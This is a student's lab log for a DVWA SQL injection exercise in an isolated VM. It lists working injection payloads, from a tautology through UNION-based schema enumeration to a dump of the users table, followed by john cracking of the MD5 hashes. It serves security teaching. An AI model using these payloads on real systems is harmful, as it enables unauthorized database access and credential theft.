# Lab 3 — SQL Injection Execution Log & Deliverables Checklist

> **Student ID**: 2301563  
> **Module**: Computer Security — Lab 3: SQL Injection (SQLi) with DVWA  
> **Environment**: Isolated VirtualBox Kali Linux VM (`kali-linux-2026.3-virtualbox-amd64` — `http://127.0.0.1:42001/`)

---

## 1. Lab Environment & DVWA Deployment Record

| Component | Machine / Service | IP / Target URL | Configured & Verified? |
| :--- | :--- | :--- | :---: |
| **Attacker Browser** | Kali Linux (`kali-linux-2026.3-virtualbox-amd64` — Firefox ESR) | `192.168.100.3` (`127.0.0.1`) | [x] |
| **DVWA Target** | Kali Local `dvwa` Service (Nginx + PHP-FPM + MariaDB) | `http://127.0.0.1:42001/` | [x] |
| **Database Initialized** | `setup.php` $\rightarrow$ **Create / Reset Database** | `11.8.8-MariaDB-1 from Debian` (`dvwa` schema) | [x] |
| **DVWA Security Level** | **DVWA Security** $\rightarrow$ **`Low`** (`Security level set to low`) | Verified in bottom-left footer (`SQLi DB: mysql`) | [x] |
| **Pre-Lab Snapshot** | VirtualBox Snapshot (`Pre-Lab3-DVWA-Ready`) | Saved on `D:\VMs\VirtualBox` | [x] |

---

## 2. Step-by-Step SQL Injection Payload & Observation Log

| Step | Goal | Exact Payload Entered in `User ID` | Observed Output / Notes |
| :---: | :--- | :--- | :--- |
| **1** | Parameter Discovery | `1` *(then URL `?id=2`, `?id=3`, `?id=4`, `?id=5`)* | `ID: 1` $\rightarrow$ `admin / admin`; `?id=3` $\rightarrow$ `ID: 3`, `First name: Hack`, `Surname: Me` |
| **2** | Boolean Tautology | `%' or '0'='0` | Returned all **5** user records (`admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, `Bob Smith`) in a single query |
| **3** | DB Version Fingerprint | `%' or 0=0 union select null, version() #` | DB Version: `11.8.8-MariaDB-1 from Debian` |
| **4** | Active DB User | `%' or 0=0 union select null, user() #` | DB User: `dvwa@localhost` |
| **5** | All Schema Tables | `%' and 1=0 union select null, table_name from information_schema.tables #` | Original 5 rows suppressed (`and 1=0`); listed all system metadata tables + `USERS`, `guestbook` |
| **6** | Filter `user%` Tables | `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#` | Matched 4 tables: `USERS`, `USER_PRIVILEGES`, `USER_STATISTICS`, `user_variables` |
| **7** | Credential Hash Dump | `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #` | Exfiltrated all 5 accounts & 32-char MD5 hashes (logged below) |
| **8** *(Bonus)* | Crack MD5s (`john`) | `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --pot=lab3_md5.pot dvwa_hashes.txt` | Cracked **5 / 5** hashes (4 unique digests) in `0:00:00:00` (< 1 s) at `51,200 p/s` (`76,800 C/s`) |

---

## 3. Exfiltrated `users` Table Credentials (Step 7 & Bonus Step 8)

| `user_id` | `first_name` | `last_name` | `user` | Extracted MD5 Hash (`password`) | Cracked Plaintext *(Step 8)* |
| :---: | :--- | :--- | :--- | :--- | :--- |
| `1` | `admin` | `admin` | `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| `2` | `Gordon` | `Brown` | `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| `3` | `Hack` | `Me` | `1337` | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| `4` | `Pablo` | `Picasso` | `pablo` | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| `5` | `Bob` | `Smith` | `smithy` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

---

## 4. Screenshots Checklist

All deliverable screenshots verified in `Labs/Lab3/Deliverables/`:

- [x] `0.1-Pre-Lab3-DVWA-Read.png` — **DVWA Security** page confirming `Security level is currently: low` (`http://127.0.0.1:42001/security.php`).
- [x] `01_step1_basic_parameter_discovery.png` — Step 1 parameter tampering (`?id=3&Submit=Submit#` returning `ID: 3`, `First name: Hack`, `Surname: Me`).
- [x] `02_step2_tautology_all_users.png` — Step 2 boolean tautology (`%' or '0'='0`) returning all 5 users at once.
- [x] `03_step3_db_version.png` — Step 3 `UNION SELECT null, version() #` revealing `11.8.8-MariaDB-1 from Debian`.
- [x] `04_step4_db_user.png` — Step 4 `UNION SELECT null, user() #` revealing `dvwa@localhost`.
- [x] `05_step5_information_schema_tables.png` — Step 5 `information_schema.tables` full enumeration with original rows suppressed (`and 1=0`).
- [x] `06_step6_filtered_user_tables.png` — Step 6 `WHERE table_name LIKE 'user%'` filtering down to `USERS`, `USER_PRIVILEGES`, `USER_STATISTICS`, and `user_variables`.
- [x] `07_step7_dumped_credentials_hashes.png` — Step 7 `concat(...)` full dump displaying usernames and MD5 password hashes.
- [x] `08_bonus_john_md5_cracked.png` — Bonus Step 8 Kali terminal cracking all 5 dumped MD5 hashes in `< 1s` (`51200p/s`) with `john --format=raw-md5`.

---

## 5. Report Link

- Google Doc / Report URL: https://docs.google.com/document/d/1KOOJdUVvvXu9R8gPZvmXtBuRw-2Uatn6oKQeklofWYo/edit?usp=sharing
